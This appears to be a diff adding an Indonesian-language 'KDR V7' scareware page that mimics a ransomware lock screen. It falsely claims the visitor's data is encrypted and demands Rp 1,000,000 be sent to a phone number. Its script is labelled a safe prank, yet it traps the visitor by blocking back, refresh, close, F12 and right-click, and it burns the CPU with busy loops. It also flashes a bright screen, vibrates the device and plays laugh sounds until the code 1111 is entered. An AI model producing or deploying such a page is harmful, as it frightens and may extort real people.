@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>⚠️ KDR V7 - SYSTEM LOCKED ⚠️</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: black;
+            font-family: 'Courier New', 'Creepster', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        /* Overlay virus KDR */
+        .kdr-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, #1a0000, #000000);
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 1rem;
+            backdrop-filter: blur(5px);
+            animation: bgTremor 0.08s infinite;
+        }
+
+        @keyframes bgTremor {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 2% 2%; }
+        }
+
+        /* Efak darah bergerak */
+        .blood-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(45deg, rgba(139,0,0,0.15) 0px, rgba(139,0,0,0.15) 5px, transparent 5px, transparent 15px);
+            pointer-events: none;
+            z-index: 15000;
+            animation: bloodFlow 0.4s linear infinite;
+        }
+
+        @keyframes bloodFlow {
+            0% { background-position: 0 0; }
+            100% { background-position: 20px 20px; }
+        }
+
+        /* Glitch teks */
+        .glitch-kdr {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #ff1111;
+            text-shadow: 4px 4px 0 #8b0000, -3px -3px 0 #ff6666;
+            animation: glitchKdr 0.09s infinite;
+            letter-spacing: 5px;
+            margin-bottom: 20px;
+        }
+
+        @keyframes glitchKdr {
+            0% { transform: skew(0deg); text-shadow: 3px 3px 0 red; }
+            90% { transform: skew(0deg); }
+            92% { transform: skew(12deg, 5deg); text-shadow: -4px -4px 0 #ff4444; }
+            94% { transform: skew(-10deg, -4deg); }
+            96% { transform: skew(4deg, 2deg); }
+            100% { transform: skew(0deg); }
+        }
+
+        .skull-icon {
+            font-size: 5rem;
+            filter: drop-shadow(0 0 20px red);
+            animation: shakeViolent 0.07s infinite;
+            margin: 10px 0;
+        }
+
+        @keyframes shakeViolent {
+            0% { transform: translate(0px, 0px) rotate(0deg); }
+            25% { transform: translate(7px, -5px) rotate(4deg); }
+            50% { transform: translate(-6px, 6px) rotate(-4deg); }
+            75% { transform: translate(5px, 4px) rotate(2deg); }
+            100% { transform: translate(0px, 0px); }
+        }
+
+        .card-kdr {
+            background: #000000cc;
+            backdrop-filter: blur(20px);
+            border: 3px solid #ff0000;
+            border-radius: 35px;
+            padding: 1.8rem;
+            max-width: 520px;
+            width: 92%;
+            margin: 15px auto;
+            box-shadow: 0 0 80px rgba(255,0,0,0.6), inset 0 0 20px rgba(255,0,0,0.3);
+            animation: borderPulse 0.4s infinite alternate;
+        }
+
+        @keyframes borderPulse {
+            0% { border-color: #ff0000; box-shadow: 0 0 50px rgba(255,0,0,0.5); }
+            100% { border-color: #ff6666; box-shadow: 0 0 100px rgba(255,0,0,0.9); }
+        }
+
+        .warning-text {
+            font-size: 1rem;
+            color: #ffaaaa;
+            background: #330000;
+            padding: 12px;
+            border-radius: 20px;
+            margin: 15px 0;
+            border-left: 6px solid red;
+        }
+
+        .pin-box {
+            background: #0a0a0a;
+            border: 2px solid #ff3333;
+            border-radius: 60px;
+            padding: 10px;
+            width: 250px;
+            margin: 15px auto;
+        }
+
+        .pin-input {
+            background: transparent;
+            border: none;
+            color: #ff8888;
+            font-size: 1.8rem;
+            text-align: center;
+            width: 100%;
+            font-family: monospace;
+            letter-spacing: 10px;
+            outline: none;
+        }
+
+        button {
+            background: #2a0000;
+            border: 2px solid #ff3333;
+            color: #ff9999;
+            padding: 12px 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.05s linear;
+        }
+
+        button:active {
+            transform: scale(0.95);
+            background: #660000;
+        }
+
+        /* Efek flash senter (layar putih terang) */
+        .flash-senter {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 30000;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.05s;
+        }
+
+        /* Efek lag overlay */
+        .lag-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 40000;
+            pointer-events: none;
+        }
+
+        /* Pesan setelah unlock */
+        .unlock-success {
+            background: #0f0f0f;
+            padding: 2rem;
+            border-radius: 30px;
+            text-align: center;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="kdr-overlay" id="kdrScreen">
+    <div class="skull-icon">💀☠️👁️🔒</div>
+    <div class="glitch-kdr">!!! KDR V7 ACTIVATED !!!</div>
+    <div class="card-kdr">
+        <div style="font-size:1.3rem; color:#ff5555;">🔐 PERANGKAT TERKUNCI 🔐</div>
+        <div class="warning-text">
+            ⚠️ SEMUA DATA ANDA TELAH DIENKRIPSI ⚠️<br>
+            Untuk membuka perangkat, transfer <strong style="color:#ffaa00;">Rp 1.000.000</strong> ke:<br>
+            <span style="background:#111; padding:4px 8px; display:inline-block; margin:8px 0;">085194279722</span><br>
+            (BANK INDONESIA)<br>
+            <span style="font-size:0.8rem;">Salam dari KAISAR☠️</span>
+        </div>
+        <div class="pin-box">
+            <input type="password" id="kdrPin" class="pin-input" maxlength="4" inputmode="numeric" placeholder="****">
+        </div>
+        <button id="unlockKdrBtn">⚡ BUKA KUNCI ⚡</button>
+        <div id="errorMsg" style="color:#ff8888; font-size:0.7rem; margin-top:12px;"></div>
+    </div>
+</div>
+
+<div class="blood-overlay"></div>
+<div class="flash-senter" id="flashSenter"></div>
+<div class="lag-layer" id="lagLayer"></div>
+
+<script>
+    (function() {
+        // ========== KDR V7 VIRUS PRANK (AMAN, HANYA SIMULASI) ==========
+        let isUnlocked = false;
+        let soundInterval = null;
+        let audioCtx = null;
+        let isSoundPlaying = false;
+        let lagInterval = null;
+        let flashInterval = null;
+        let flashEndTimeout = null;
+        let vibrationInterval = null;
+        
+        const kdrScreen = document.getElementById('kdrScreen');
+        const pinInput = document.getElementById('kdrPin');
+        const unlockBtn = document.getElementById('unlockKdrBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const flashSenter = document.getElementById('flashSenter');
+        
+        const UNLOCK_CODE = "1111";
+        
+        // === 1. SUARA TAWA "HAHAHAHAHAHA" SETIAP DETIK ===
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            return audioCtx;
+        }
+        
+        function playLaughSound() {
+            if (!isSoundPlaying || isUnlocked) return;
+            const ctx = initAudio();
+            if (ctx.state !== 'running') return;
+            const now = ctx.currentTime;
+            
+            // Buat suara tawa dengan 3 oscillator
+            for (let i = 0; i < 3; i++) {
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = i === 0 ? 'sawtooth' : 'square';
+                let freq = 320 + i * 60 + Math.random() * 40;
+                osc.frequency.value = freq;
+                gain.gain.value = 0.15;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.frequency.exponentialRampToValueAtTime(freq * 1.7, now + 0.2);
+                osc.frequency.exponentialRampToValueAtTime(freq * 0.7, now + 0.5);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.7);
+                osc.stop(now + 0.7);
+            }
+            // Efek "HAHAHA" tambahan
+            const laughOsc = ctx.createOscillator();
+            const laughGain = ctx.createGain();
+            laughOsc.type = 'triangle';
+            laughOsc.frequency.value = 400;
+            laughGain.gain.value = 0.12;
+            laughOsc.connect(laughGain);
+            laughGain.connect(ctx.destination);
+            laughOsc.start();
+            laughOsc.frequency.exponentialRampToValueAtTime(550, now + 0.2);
+            laughOsc.frequency.exponentialRampToValueAtTime(300, now + 0.45);
+            laughGain.gain.exponentialRampToValueAtTime(0.0001, now + 0.6);
+            laughOsc.stop(now + 0.6);
+        }
+        
+        function startLaughLoop() {
+            if (isSoundPlaying) return;
+            isSoundPlaying = true;
+            const ctx = initAudio();
+            ctx.resume().then(() => {
+                // Mainkan tawa setiap 1 detik
+                soundInterval = setInterval(() => {
+                    if (isSoundPlaying && !isUnlocked) {
+                        playLaughSound();
+                        // tambahan tawa cepat kadang-kadang
+                        if (Math.random() > 0.7) {
+                            setTimeout(() => playLaughSound(), 200);
+                        }
+                    }
+                }, 1000);
+            }).catch(e => console.log);
+        }
+        
+        function stopLaugh() {
+            if (soundInterval) clearInterval(soundInterval);
+            isSoundPlaying = false;
+        }
+        
+        // === 2. EFEK NGELAG (HP LEMOT) ===
+        function startLagEffect() {
+            lagInterval = setInterval(() => {
+                if (isUnlocked) return;
+                // Loop berat untuk membuat lag (aman, tidak merusak)
+                for (let i = 0; i < 15000000; i++) { /* buang waktu */ }
+                // Gerakan layar acak seperti hang
+                document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
+                setTimeout(() => {
+                    if (!isUnlocked) document.body.style.transform = '';
+                }, 120);
+                // Nonaktifkan pointer sesaat
+                kdrScreen.style.pointerEvents = 'none';
+                setTimeout(() => {
+                    if (!isUnlocked) kdrScreen.style.pointerEvents = 'auto';
+                }, 400);
+                // Paksa scroll ke atas
+                window.scrollTo(0, 0);
+            }, 1500);
+        }
+        
+        // === 3. SENTER HP MENYALA SELAMA 1 MENIT ===
+        function startFlashlight() {
+            // Nyalakan flash (layar putih terang)
+            flashSenter.style.opacity = "0.95";
+            flashSenter.style.transition = "opacity 0.1s";
+            // Biarkan menyala 1 menit (60 detik)
+            flashEndTimeout = setTimeout(() => {
+                if (!isUnlocked) {
+                    flashSenter.style.opacity = "0";
+                }
+            }, 60000);
+            // Tambahan efek kedip selama 1 menit agar lebih dramatis
+            let flashCount = 0;
+            flashInterval = setInterval(() => {
+                if (isUnlocked) {
+                    clearInterval(flashInterval);
+                    return;
+                }
+                if (flashCount < 12) { // kedip setiap 5 detik selama 1 menit
+                    flashSenter.style.opacity = "1";
+                    setTimeout(() => { if (!isUnlocked) flashSenter.style.opacity = "0.95"; }, 200);
+                }
+                flashCount++;
+                if (flashCount >= 12) clearInterval(flashInterval);
+            }, 5000);
+        }
+        
+        // === 4. GETARAN HP (VIBRATE) ===
+        function startVibration() {
+            if (!navigator.vibrate) return;
+            vibrationInterval = setInterval(() => {
+                if (!isUnlocked) {
+                    navigator.vibrate([400, 200, 500]);
+                }
+            }, 4000);
+        }
+        
+        // === 5. BLOKIR KELUAR (BACK, REFRESH, CLOSE) ===
+        function blockExit() {
+            // Push state berlapis
+            for (let i = 0; i < 15; i++) history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function(e) {
+                if (!isUnlocked) {
+                    for (let i = 0; i < 30; i++) history.pushState(null, null, location.href);
+                    // Tampilkan peringatan palsu
+                    const div = document.createElement('div');
+                    div.innerText = "⚠️ KDR V7: PERCOBAAN KELUAR DIBLOKIR ⚠️";
+                    div.style.position = "fixed";
+                    div.style.bottom = "20px";
+                    div.style.left = "20px";
+                    div.style.background = "red";
+                    div.style.color = "black";
+                    div.style.padding = "8px";
+                    div.style.zIndex = "99999";
+                    div.style.fontSize = "12px";
+                    document.body.appendChild(div);
+                    setTimeout(() => div.remove(), 2000);
+                }
+            });
+            window.addEventListener('beforeunload', (e) => {
+                if (!isUnlocked) {
+                    e.preventDefault();
+                    e.returnValue = 'KDR V7 - Jangan tutup halaman!';
+                    return '';
+                }
+            });
+            document.addEventListener('keydown', (e) => {
+                if ((e.ctrlKey && (e.key === 'r' || e.key === 'R')) || e.key === 'F5') {
+                    if (!isUnlocked) e.preventDefault();
+                }
+                if (e.key === 'F12') e.preventDefault();
+            });
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+        }
+        
+        // === 6. UNLOCK (KODE 1111) ===
+        function unlockDevice() {
+            if (isUnlocked) return;
+            isUnlocked = true;
+            // Hentikan semua efek
+            if (soundInterval) clearInterval(soundInterval);
+            if (lagInterval) clearInterval(lagInterval);
+            if (flashInterval) clearInterval(flashInterval);
+            if (vibrationInterval) clearInterval(vibrationInterval);
+            if (flashEndTimeout) clearTimeout(flashEndTimeout);
+            stopLaugh();
+            if (navigator.vibrate) navigator.vibrate(0);
+            // Matikan flash
+            flashSenter.style.opacity = "0";
+            // Tampilkan pesan sukses
+            kdrScreen.innerHTML = `
+                <div class="unlock-success">
+                    <div style="font-size:4rem;">🔓✅</div>
+                    <h2 style="color:#0f0;">PERANGKAT TERBUKA</h2>
+                    <p style="color:#ccc;">Kode benar. Perangkat Anda aman.</p>
+                    <p style="color:#ffaa66;">Terima kasih sudah menggunakan layanan KDR V7.</p>
+                    <button id="exitNow" style="background:green; border:none; margin-top:20px;">KELUAR</button>
+                </div>
+            `;
+            document.getElementById('exitNow').addEventListener('click', () => {
+                window.location.reload();
+            });
+        }
+        
+        // Cek PIN
+        function checkPin() {
+            if (isUnlocked) return;
+            const pin = pinInput.value.trim();
+            if (pin === UNLOCK_CODE) {
+                unlockDevice();
+            } else {
+                errorMsg.innerText = "❌ KODE SALAH! PERCOBAAN GAGAL. DATA AKAN DIHAPUS ❌";
+                pinInput.value = "";
+                pinInput.focus();
+                if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+                // Mainkan suara tawa ekstra
+                if (audioCtx && isSoundPlaying) playLaughSound();
+                // Efek flash merah sebentar
+                flashSenter.style.backgroundColor = "#ff0000";
+                flashSenter.style.opacity = "0.8";
+                setTimeout(() => {
+                    if (!isUnlocked) flashSenter.style.opacity = "0.95";
+                    flashSenter.style.backgroundColor = "white";
+                }, 500);
+            }
+        }
+        
+        // === 7. MEMULAI SEMUA ===
+        function initKDR() {
+            blockExit();
+            startLagEffect();
+            startFlashlight();
+            startVibration();
+            // Suara dimulai setelah user berinteraksi (karena autoplay policy)
+            let audioStarted = false;
+            function startAudioOnUser() {
+                if (audioStarted) return;
+                audioStarted = true;
+                startLaughLoop();
+                document.removeEventListener('click', startAudioOnUser);
+                document.removeEventListener('touchstart', startAudioOnUser);
+            }
+            document.addEventListener('click', startAudioOnUser);
+            document.addEventListener('touchstart', startAudioOnUser);
+            
+            unlockBtn.addEventListener('click', checkPin);
+            pinInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') checkPin();
+            });
+            // Auto-check saat 4 digit
+            pinInput.addEventListener('input', () => {
+                if (pinInput.value.length === 4 && pinInput.value !== UNLOCK_CODE) {
+                    setTimeout(() => checkPin(), 30);
+                } else if (pinInput.value.length === 4 && pinInput.value === UNLOCK_CODE) {
+                    unlockDevice();
+                }
+            });
+        }
+        
+        initKDR();
+        
+        // Console warning (tidak terlihat oleh user biasa)
+        console.log("%c⚠️ KDR V7 - SIMULASI VIRUS (AMAN) ⚠️", "color: red; font-size: 14px; background: black;");
+    })();
+</script>
+</body>
+</html>
